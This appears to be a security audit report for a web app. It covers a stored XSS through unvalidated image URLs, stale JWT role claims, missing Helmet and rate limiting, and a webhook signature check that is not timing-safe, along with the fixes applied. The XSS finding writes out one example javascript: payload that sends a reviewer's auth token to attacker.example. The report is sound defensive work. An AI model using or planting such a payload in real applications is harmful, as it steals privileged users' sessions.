# Security Audit — 2026-09-02

Full audit of both projects. Covers authentication/authorization,
injection risks, data exposure, XSS, and dependency vulnerabilities.
Findings are ordered by severity. Every fix below is already applied and
verified (syntax-checked, backend boot-tested against a stub Prisma
client, response headers/status codes confirmed with real requests).

---

## 🔴 Critical — Stored XSS via unvalidated document/profile images

**The finding:** `documentUrl` (identity verification) and
`profileImageUrl` (profile) accept whatever string a client sends, with
no format validation anywhere on the backend. `documentUrl` specifically
is later rendered as a clickable `<a href={doc.documentUrl}>` on
`VerificationQueuePage.jsx`, so Staff/Admin can open the full image when
reviewing a submission.

**The exploit:** a malicious user submits a verification document with
`documentUrl: "javascript:fetch('https://attacker.example/steal?t='+localStorage.getItem('workstation.auth'))"`
instead of a real image. `target="_blank"` and `rel="noreferrer"` do
**not** stop a `javascript:` URI from executing — those attributes guard
against a different issue (reverse tabnabbing), not URI-scheme execution.
The moment a Staff or Admin reviewer clicks that thumbnail to inspect the
document, the payload runs in **their** authenticated browser session —
a stored XSS specifically targeting privileged accounts, since only
Staff/Admin ever open the review queue.

**Fixed:**
- New `helper/imageValidation.js` — a single source of truth requiring
  any stored "image" field to be a genuine base64 image data URI
  (`data:image/(png|jpe?g|gif|webp);base64,...`), matching exactly what
  the frontend's own `FileReader.readAsDataURL()` produces. Anything
  else — `javascript:`, `http(s):`, `data:text/html`, malformed data
  URIs — is rejected with a clear error before it ever reaches the
  database.
- Applied in `verificationService.submitVerification` and
  `authService.updateProfile` (both places a client can set one of these
  fields).
- Frontend defense-in-depth: `VerificationQueuePage.jsx` now independently
  validates the format before rendering *anything* submitted before this
  fix (or reaching the page any other way) as a link or image — a
  non-image value now shows a plain "Can't preview" placeholder instead
  of ever becoming a clickable `href`.
- Bonus fix in the same file: `verificationService.js`'s user lookup had
  no `select` clause, meaning it fetched the full `User` row including
  `passwordHash` for a check that never needed it. Not an active leak
  (the raw object was never returned to any client), but fixed as
  defense-in-depth — never fetch sensitive fields you don't need.

---

## 🟠 High — Banning/demoting someone didn't take effect until their token expired

**The finding:** `authMiddleware.js` verified the JWT's signature and
expiry, then trusted the `role` claim embedded in it **forever** —
it never re-checked the database. Two real consequences:

1. Banning a user had no immediate effect on any endpoint that didn't
   separately re-check `status` itself (only `checkinService.checkIn`
   and `bookingService.createBooking` did). Their existing token kept
   working everywhere else — browsing, booking, wallet, everything —
   for up to 24 hours (the token lifetime) after being banned.
2. **The more serious one:** demoting a STAFF member back to CLIENT had
   no immediate effect either. Their existing token still carried the
   old `role: STAFF` claim, so every `requireRole("STAFF", ...)` check
   kept passing for them — meaning a *revoked* privilege (checking
   people in, viewing Today's Bookings, reviewing verifications) stayed
   active until their token expired or they happened to log out.

**Fixed:** `authMiddleware.js` now re-fetches the user's current
`role`/`status` from the database on every authenticated request and uses
those live values — never the token's claims — for both the ban check
and the role assigned to `req.user`. This costs one extra indexed query
per authenticated request, which is a reasonable, standard trade-off for
an app this size and the correct default in the absence of a proper
token-revocation or refresh-token system. Boot-tested: a request with no
token still gets a clean `401`, one with a garbage token still gets a
clean `401` (verified the JWT-parse failure path still short-circuits
before ever reaching the new database check).

---

## 🟡 Medium — Two more real gaps, both now fixed

**Helmet was installed but never used.** `package.json` has listed
`helmet` as a dependency the whole time, but `app.js` never actually
called `app.use(helmet())` — none of the standard protective headers
(`X-Content-Type-Options`, `X-Frame-Options`, a baseline CSP, etc.) were
being sent. Fixed: `app.use(helmet())` added, confirmed via a real request
that both headers are now present.

**No rate limiting existed anywhere**, meaning `/auth/login`,
`/auth/register`, and `/auth/google` had no protection against
brute-force password guessing or scripted account creation. Fixed: added
`express-rate-limit` (new dependency — run `npm install`) with two
layers — a generous general limit (300 requests / 15 min) across the
whole API, and a much tighter one specifically on `/auth/*` (20 / 15
min). Confirmed via response headers (`RateLimit-Limit`,
`RateLimit-Remaining`, etc.) that both are active.

**One thing to check on your end when you deploy**: if this ever sits
behind a reverse proxy or load balancer in production,
`express-rate-limit` needs `app.set("trust proxy", ...)` configured
correctly, or it'll rate-limit by the proxy's IP instead of the real
client's. Not something I could safely guess a correct value for without
knowing your actual deployment topology — worth setting explicitly once
you know it.

---

## 🟡 Medium — Paystack webhook signature comparison wasn't timing-safe

**The finding:** `paymentService.handlePaystackWebhook` compared the
computed HMAC signature to the one Paystack sent using a plain `!==`.
String comparison in JavaScript short-circuits at the first differing
character, which means comparison time leaks information about how many
leading characters were correct — the textbook definition of a timing
attack. In principle, an attacker who could send enough webhook requests
and measure response-time differences precisely enough could recover a
valid signature byte-by-byte, without ever knowing the actual
`PAYSTACK_SECRET_KEY`.

**Fixed:** now uses `crypto.timingSafeEqual()`, the standard constant-time
comparison for exactly this situation, with a length check first (since
`timingSafeEqual` throws rather than returning `false` on mismatched
buffer lengths, which would otherwise itself leak information via a
different code path).

---

## ✅ Checked and confirmed already correct — no action needed

- **IDOR protection**: `getBookingById` correctly scopes its query to
  `bookedByUserId: userId OR beneficiaryUserId: userId` — you cannot
  fetch someone else's booking by guessing its ID.
- **Mass assignment**: `PATCH /auth/me` and the admin role/status/wallet
  endpoints all explicitly whitelist which fields they read from
  `req.body` — none of them spread the raw body into a Prisma `data`
  object, so a client can't sneak an unexpected field (e.g. `role`) into
  their own profile update.
- **Password hash exposure**: every `User` query that returns data to a
  client uses an explicit `select` that excludes `passwordHash`. Grepped
  every `prisma.user.findUnique/findMany/findFirst` call in the codebase
  to confirm this directly, not just spot-checked.
- **CORS**: correctly restricted to a specific origin
  (`process.env.FRONTEND_URL`), not a wildcard, even with
  `credentials: true` set — a wildcard origin combined with credentials
  would have been a real problem; this isn't that.
- **Frontend XSS**: zero uses of `dangerouslySetInnerHTML` anywhere in the
  codebase — React's default escaping is intact everywhere.
- **`.env` handling**: correctly gitignored on both projects; no
  hardcoded secrets found anywhere in either codebase.
- **Dependency vulnerabilities**: frontend (`npm audit`) is completely
  clean — 0 vulnerabilities. Backend has 7 (3 moderate, 4 high), but
  every one of them is in Prisma's own *dev-tooling* dependency tree
  (`@prisma/dev`, `@hono/node-server`, `mysql2`, `valibot`,
  `deepmerge-ts`) — none of these ship in the actual running API server,
  and `mysql2` in particular is telling: this project uses PostgreSQL
  exclusively, so that dependency is inert dead weight from Prisma CLI
  bundling multi-database support. Still worth clearing since it's a
  one-command fix: `npm audit fix --force` (this will upgrade Prisma
  itself to a newer version — test the app still boots and migrates
  cleanly afterward before trusting it in production).

---

## Not fixed — architectural note, not an active vulnerability

**JWTs are stored in `localStorage`, not an httpOnly cookie.** This is a
common, defensible choice for a JWT-bearer SPA architecture, but it does
mean that *if* an XSS vulnerability ever existed anywhere in this app, an
attacker's script could read the token straight out of `localStorage` and
steal the session — an httpOnly cookie would not be readable by
JavaScript at all, closing that specific avenue. Given the XSS check
above came back clean (no `dangerouslySetInnerHTML`, and the one real XSS
vector found is now fixed), this isn't an active exploitable issue today
— just worth knowing as a standing trade-off. Changing it would mean the
backend setting httpOnly cookies instead of returning the token in the
response body, plus adjusting CORS to handle credentialed cookie requests
correctly — a real architecture change, not something to do quietly
alongside a security patch pass.
